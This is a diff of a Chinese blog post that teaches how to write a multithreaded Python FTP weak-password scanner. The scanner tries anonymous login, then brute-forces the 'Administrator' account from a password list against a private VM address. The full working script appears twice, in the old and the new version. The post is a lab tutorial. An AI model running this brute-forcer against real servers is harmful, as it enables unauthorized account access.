@@ -20,12 +20,12 @@
     var CONFIG = {"hostname":"2324152038.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"livere","storage":true,"lazyload":false,"nav":null,"activeClass":"livere"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="前言 弱口令扫描器类型很多，包括扫描ssh，mysql等等，这里介绍的ftp的弱口令扫描器，这些扫描器类型都大差不差。这里主要用到了两个库 ftplib库和threading库 库的安装可以去我的另一篇文章学习  简单爬虫 | RISE (chunquchunlai.top) 准备阶段 我们来学习一下ftplib库和threading库 ————threading库———— 可以去我这篇文章学习">
+  <meta name="description" content="前言弱口令扫描器类型很多，包括扫描ssh，mysql等等，这里介绍的ftp的弱口令扫描器，这些扫描器类型都大差不差。这里主要用到了两个库 ftplib库和threading库 库的安装可以去我的另一篇文章学习  简单爬虫 | RISE (chunquchunlai.top) 准备阶段我们来学习一下ftplib库和threading库 ————threading库————可以去我这篇文章学习 多线程">
 <meta property="og:type" content="article">
 <meta property="og:title" content="弱口令扫描器">
 <meta property="og:url" content="http://2324152038.github.io/2022/09/02/%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%89%AB%E6%8F%8F%E5%99%A8/index.html">
 <meta property="og:site_name" content="RISE">
-<meta property="og:description" content="前言 弱口令扫描器类型很多，包括扫描ssh，mysql等等，这里介绍的ftp的弱口令扫描器，这些扫描器类型都大差不差。这里主要用到了两个库 ftplib库和threading库 库的安装可以去我的另一篇文章学习  简单爬虫 | RISE (chunquchunlai.top) 准备阶段 我们来学习一下ftplib库和threading库 ————threading库———— 可以去我这篇文章学习">
+<meta property="og:description" content="前言弱口令扫描器类型很多，包括扫描ssh，mysql等等，这里介绍的ftp的弱口令扫描器，这些扫描器类型都大差不差。这里主要用到了两个库 ftplib库和threading库 库的安装可以去我的另一篇文章学习  简单爬虫 | RISE (chunquchunlai.top) 准备阶段我们来学习一下ftplib库和threading库 ————threading库————可以去我这篇文章学习 多线程">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://chunquchunlai.oss-cn-chengdu.aliyuncs.com/asdasdoo.png">
 <meta property="og:image" content="https://chunquchunlai.oss-cn-chengdu.aliyuncs.com/audyafafyfff.png">
@@ -34,7 +34,7 @@
 <meta property="og:image" content="https://chunquchunlai.oss-cn-chengdu.aliyuncs.com/20220902115930.jpg">
 <meta property="og:image" content="https://chunquchunlai.oss-cn-chengdu.aliyuncs.com/asdrtttt.png">
 <meta property="article:published_time" content="2022-09-02T03:00:49.000Z">
-<meta property="article:modified_time" content="2022-09-02T04:08:19.399Z">
+<meta property="article:modified_time" content="2022-09-05T03:06:58.280Z">
 <meta property="article:author" content="春去春来">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://chunquchunlai.oss-cn-chengdu.aliyuncs.com/asdasdoo.png">
@@ -189,10 +189,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2022-09-02 11:00:49 / 修改时间：12:08:19" itemprop="dateCreated datePublished" datetime="2022-09-02T11:00:49+08:00">2022-09-02</time>
+              <time title="创建时间：2022-09-02 11:00:49" itemprop="dateCreated datePublished" datetime="2022-09-02T11:00:49+08:00">2022-09-02</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-09-05 11:06:58" itemprop="dateModified" datetime="2022-09-05T11:06:58+08:00">2022-09-05</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -214,17 +220,13 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p><strong>前言</strong></p>
-<p>弱口令扫描器类型很多，包括扫描ssh，mysql等等，这里介绍的ftp的弱口令扫描器，这些扫描器类型都大差不差。这里主要用到了两个库 ftplib库和threading库</p>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h1><p>弱口令扫描器类型很多，包括扫描ssh，mysql等等，这里介绍的ftp的弱口令扫描器，这些扫描器类型都大差不差。这里主要用到了两个库 ftplib库和threading库</p>
 <p>库的安装可以去我的另一篇文章学习 </p>
 <p><a target="_blank" rel="noopener" href="http://chunquchunlai.top/2022/08/27/%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/">简单爬虫 | RISE (chunquchunlai.top)</a></p>
-<p><strong>准备阶段</strong></p>
-<p>我们来学习一下ftplib库和threading库</p>
-<p>————threading库————</p>
-<p>可以去我这篇文章学习</p>
+<h1 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a><strong>准备阶段</strong></h1><p>我们来学习一下ftplib库和threading库</p>
+<h2 id="————threading库————"><a href="#————threading库————" class="headerlink" title="————threading库————"></a>————threading库————</h2><p>可以去我这篇文章学习</p>
 <p><a target="_blank" rel="noopener" href="http://chunquchunlai.top/2022/08/30/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8/">多线程端口扫描器 | RISE (chunquchunlai.top)</a></p>
-<p>—————ftplib库——————</p>
-<p>ftplib库是因为工作需要，需要对FTP协议下的各种文件进行上传下载操作，Python中默认安装的ftplib模块定义了FTP类,可用来实现简单的ftp客户端，用于上传或下载文件，我们这里主要是去连接ftp服务器，所以涉及不到ftp文件的上传和下载</p>
+<h2 id="—————ftplib库——————"><a href="#—————ftplib库——————" class="headerlink" title="—————ftplib库——————"></a>—————ftplib库——————</h2><p>ftplib库是因为工作需要，需要对FTP协议下的各种文件进行上传下载操作，Python中默认安装的ftplib模块定义了FTP类,可用来实现简单的ftp客户端，用于上传或下载文件，我们这里主要是去连接ftp服务器，所以涉及不到ftp文件的上传和下载</p>
 <p>常用函数</p>
 <p>ftp.connect():参数是连接ftp的ip和端口</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp.connect(&quot;127.0.0.01&quot;,&quot;21&quot;)</span><br></pre></td></tr></table></figure>
@@ -245,8 +247,7 @@
 <p>ftp.rmd:删除远程目录</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp.rmd(home)</span><br></pre></td></tr></table></figure>
 
-<p><strong>代码</strong></p>
-<p>第一步，导入库</p>
+<h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a><strong>代码</strong></h1><p>第一步，导入库</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import ftplib</span><br><span class="line">import time</span><br><span class="line">import threading</span><br></pre></td></tr></table></figure>
 
 <p>第二步，匿名登录模块</p>
@@ -261,11 +262,9 @@
 <p><img src="https://chunquchunlai.oss-cn-chengdu.aliyuncs.com/asdasdoo.png">我直接在这个目录下创建了密码文件</p>
 <p><img src="https://chunquchunlai.oss-cn-chengdu.aliyuncs.com/audyafafyfff.png"></p>
 <p>里面长这样，这里是我直接输入的，你们也可以网上去找比较全的密码文件，注意，每个密码后面全是空格，所以需要用到rstrip()函数去掉右边的空格</p>
-<p>整体代码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">import ftplib</span><br><span class="line">import time</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">locka = threading.Lock()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def anonscan(hostname): #匿名扫描</span><br><span class="line">    try:</span><br><span class="line">        with ftplib.FTP(hostname) as ftp: #创建ftp对象</span><br><span class="line">            ftp.login()</span><br><span class="line">            print(&quot;[*]&quot;+str(hostname)+&quot;ftp匿名登录成功&quot;)</span><br><span class="line">            return True</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line">        print(&#x27;[*]&#x27;+str(hostname)+&quot;:ftp匿名登录失败&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def pwdscan(hostname, user, pwd):  #暴力破解</span><br><span class="line">    try:</span><br><span class="line">        with ftplib.FTP(hostname) as ftp:</span><br><span class="line">            ftp.login(user, pwd)</span><br><span class="line">            locka.acquire()</span><br><span class="line">            print(&#x27;[*]&#x27;+str(hostname)+&#x27;:破解成功&#x27;+&#x27;账号:&#x27;+str(user)+&#x27;密码:&#x27;+str(pwd))</span><br><span class="line">            locka.release()</span><br><span class="line">            return True</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main(hostname,user):  #多线程执行暴力破解</span><br><span class="line">    if anonscan(hostname):</span><br><span class="line">        pass</span><br><span class="line">    else:</span><br><span class="line">       with open(&#x27;pwd.txt&#x27;, &#x27;r&#x27;) as pf:</span><br><span class="line">          for pwds in pf:</span><br><span class="line">            pwd = pwds.rstrip()</span><br><span class="line">            t = threading.Thread(target=pwdscan, args=(hostname, user, pwd))</span><br><span class="line">            t.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">        main(&#x27;192.168.244.152&#x27;, &#x27;Administrator&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h1 id="整体代码"><a href="#整体代码" class="headerlink" title="整体代码"></a>整体代码</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">import ftplib</span><br><span class="line">import time</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">locka = threading.Lock()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def anonscan(hostname): #匿名扫描</span><br><span class="line">    try:</span><br><span class="line">        with ftplib.FTP(hostname) as ftp: #创建ftp对象</span><br><span class="line">            ftp.login()</span><br><span class="line">            print(&quot;[*]&quot;+str(hostname)+&quot;ftp匿名登录成功&quot;)</span><br><span class="line">            return True</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line">        print(&#x27;[*]&#x27;+str(hostname)+&quot;:ftp匿名登录失败&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def pwdscan(hostname, user, pwd):  #暴力破解</span><br><span class="line">    try:</span><br><span class="line">        with ftplib.FTP(hostname) as ftp:</span><br><span class="line">            ftp.login(user, pwd)</span><br><span class="line">            locka.acquire()</span><br><span class="line">            print(&#x27;[*]&#x27;+str(hostname)+&#x27;:破解成功&#x27;+&#x27;账号:&#x27;+str(user)+&#x27;密码:&#x27;+str(pwd))</span><br><span class="line">            locka.release()</span><br><span class="line">            return True</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main(hostname,user):  #多线程执行暴力破解</span><br><span class="line">    if anonscan(hostname):</span><br><span class="line">        pass</span><br><span class="line">    else:</span><br><span class="line">       with open(&#x27;pwd.txt&#x27;, &#x27;r&#x27;) as pf:</span><br><span class="line">          for pwds in pf:</span><br><span class="line">            pwd = pwds.rstrip()</span><br><span class="line">            t = threading.Thread(target=pwdscan, args=(hostname, user, pwd))</span><br><span class="line">            t.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">        main(&#x27;192.168.244.152&#x27;, &#x27;Administrator&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p><strong>运行实例</strong></p>
-<p><img src="https://chunquchunlai.oss-cn-chengdu.aliyuncs.com/asdsadasddwqe.png"></p>
+<h1 id="运行实例"><a href="#运行实例" class="headerlink" title="运行实例"></a><strong>运行实例</strong></h1><p><img src="https://chunquchunlai.oss-cn-chengdu.aliyuncs.com/asdsadasddwqe.png"></p>
 <p>这里我自己在vm搭了一个ftp的服务器，且允许匿名连接</p>
 <p>vm的ftp服务器搭建可以去这里：<a target="_blank" rel="noopener" href="https://blog.csdn.net/Modas/article/details/123401401">在 VMware 虚拟机中搭建 FTP 服务器 (详细)_Modas的博客-CSDN博客_虚拟机搭建ftp服务器</a></p>
 <p><img src="https://chunquchunlai.oss-cn-chengdu.aliyuncs.com/asdasdfvvvvv.png"></p>
@@ -363,6 +362,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%87%86%E5%A4%87%E9%98%B6%E6%AE%B5"><span class="nav-number">2.</span> <span class="nav-text">准备阶段</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E2%80%94%E2%80%94%E2%80%94%E2%80%94threading%E5%BA%93%E2%80%94%E2%80%94%E2%80%94%E2%80%94"><span class="nav-number">2.1.</span> <span class="nav-text">————threading库————</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E2%80%94ftplib%E5%BA%93%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E2%80%94"><span class="nav-number">2.2.</span> <span class="nav-text">—————ftplib库——————</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81"><span class="nav-number">3.</span> <span class="nav-text">代码</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%95%B4%E4%BD%93%E4%BB%A3%E7%A0%81"><span class="nav-number">4.</span> <span class="nav-text">整体代码</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%BF%90%E8%A1%8C%E5%AE%9E%E4%BE%8B"><span class="nav-number">5.</span> <span class="nav-text">运行实例</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -378,14 +378,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-count">10</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-count">3</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
   </nav>
